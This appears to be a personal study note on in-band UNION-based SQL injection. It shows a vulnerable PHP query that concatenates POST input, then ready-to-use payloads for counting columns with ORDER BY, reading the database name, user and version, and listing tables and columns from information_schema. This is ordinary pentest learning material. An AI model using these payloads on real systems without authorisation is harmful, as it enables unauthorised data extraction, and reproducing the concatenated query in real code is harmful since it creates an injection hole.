---
title: In-band SQL UNION Attacks
updated: 2025-04-22 11:36:52Z
created: 2025-04-22 11:13:37Z
latitude: -33.78668940
longitude: 150.95264980
altitude: 0.0000
---

## Inband SQL Injection
Whenever dealing with inband SQL injection and the result of the query is displayed along with the application returned value, test for UNION based SQL injections. For it to work:
1. The injection union query has to include the **same number of columns** as the original query.
2. The datatypes need to **match for each column**

`$query = "SELECT * FROM customers WHERE name LIKE '".$_POST["search_input"]."%'";`

**How to determine the number of columns:**
`' ORDER BY 1-- //`
then..
`' ORDER BY 2-- //`
`' ORDER BY 3-- //`
`' ORDER BY 4-- //`
etc...

**Enumeration database, user, SQL version**:
Eg: for a table with 5 columns
`%' UNION SELECT database(), user(), @@version, null, null -- //`
OR, depending on the datatypes for each field move them around
`' UNION SELECT null, null, database(), user(), @@version -- //`

**Look for other tables in the database**:

`' UNION SELECT null, table_name, column_name, table_schema, null FROM information_schema.columns WHERE table_schema=database() -- //`


